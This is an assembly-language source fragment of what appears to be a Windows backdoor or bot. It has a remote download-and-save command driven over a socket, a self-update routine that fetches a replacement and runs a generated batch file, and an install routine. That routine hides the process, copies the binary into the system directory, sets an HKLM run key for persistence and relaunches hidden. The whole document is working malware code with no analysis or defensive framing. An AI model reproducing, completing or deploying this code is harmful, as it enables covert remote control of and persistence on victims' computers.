URL_DOWNLOAD struct
  dwsocket                dword ?
  dwselfhandle            dword ?
  bsync                   byte ?
  szreply                 byte 64 dup (?)
  szurl                   byte 261 dup (?)
  szfilename              byte 261 dup (?)
URL_DOWNLOAD ends

.data
szKernel32                byte 'kernel32', 0 
szRegisterServiceProcess  byte 'RegisterServiceProcess', 0

.data?
szSystemPath              byte 261 dup(?)
szCurrentPath             byte 261 dup(?)
RegKey                    dword ?
sStartupInfo              STARTUPINFO <>
sProcessInfo              PROCESS_INFORMATION <>


.code
DownloadThread proc lpParam:dword
local download:URL_DOWNLOAD
local szDownloadBuffer[1024]:byte
invoke CopyMemory, addr download, lpParam, sizeof download
invoke GetCurrentThread
mov ecx, eax
mov eax, lpParam
assume eax:ptr URL_DOWNLOAD
mov [eax].dwselfhandle, ecx
mov [eax].bsync, 1
assume eax:nothing
invoke URLDownloadToFile, 0, addr download.szurl, addr download.szfilename, 0, 0
invoke GetCurrentThread
mov edx, eax
invoke RemoveThread, edx
invoke wsprintf, addr szDownloadBuffer, addr szDownloaded, addr download.szurl, addr download.szfilename
invoke SendMsg, download.dwsocket, addr download.szreply, addr szDownloadBuffer
ret
DownloadThread endp

UpdateThread proc lpParam:dword
local download:URL_DOWNLOAD
local szDownloadBuffer[1024]:byte
local dwBytes:dword
invoke CopyMemory, addr download, lpParam, sizeof download
invoke GetCurrentThread
mov ecx, eax
mov eax, lpParam
assume eax:ptr URL_DOWNLOAD
mov [eax].dwselfhandle, ecx
mov [eax].bsync, 1
assume eax:nothing
invoke URLDownloadToFile, 0, addr download.szurl, addr szUpdateName, 0, 0
invoke GetCurrentThread
mov edx, eax
invoke RemoveThread, edx
invoke CreateFile, addr szUpdateBatch, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
mov ecx, eax
push ecx
push ecx
invoke wsprintf, addr szDownloadBuffer, addr szUpdateCommand, addr szSystemPath, addr szSystemPath
invoke lstrlen, addr szDownloadBuffer
mov edx, eax
pop ecx
invoke WriteFile, ecx, addr szDownloadBuffer, edx, addr dwBytes, 0
pop ecx
invoke CloseHandle, ecx
invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szRegValue, 0, KEY_ALL_ACCESS, addr RegKey
invoke RegDeleteValue, RegKey, addr szRegName
invoke RegCloseKey, RegKey
invoke closesocket, download.dwsocket
invoke WSACleanup
invoke WinExec, addr szUpdateBatch, 0
invoke ExitProcess, 0
ret
UpdateThread endp

Install proc
invoke Sleep, 1000
invoke GetModuleHandle, addr szKernel32
invoke GetProcAddress, eax, addr szRegisterServiceProcess
xchg eax, ecx
jecxz @F
push 1
push 0
call ecx
@@:
invoke WSAStartup, 101h, addr WSAData
ret

invoke GetModuleFileName, 0, addr szCurrentPath, 261
invoke GetSystemDirectory, addr szSystemPath, 261
invoke SetCurrentDirectory, addr szSystemPath
invoke lstrcat, addr szSystemPath, addr szBack
invoke lstrcat, addr szSystemPath, addr szServerName
invoke lstrcmpi, addr szCurrentPath, addr szSystemPath
.if eax != 0
  invoke DeleteFile, addr szSystemPath
  invoke CopyFile, addr szCurrentPath, addr szSystemPath, 0
  invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szRegValue, 0, KEY_ALL_ACCESS, addr RegKey
  invoke RegSetValueEx, RegKey, addr szRegName, 0, REG_SZ, addr szServerName, sizeof szServerName
  invoke RegCloseKey, RegKey
  mov sStartupInfo.dwFlags, STARTF_USESHOWWINDOW
  mov sStartupInfo.wShowWindow, SW_HIDE
  invoke CreateProcess, 0, addr szSystemPath, 0, 0, FALSE, 0, 0, 0, addr sStartupInfo, addr sProcessInfo
  invoke ExitProcess, 0
.endif
ret
Install endp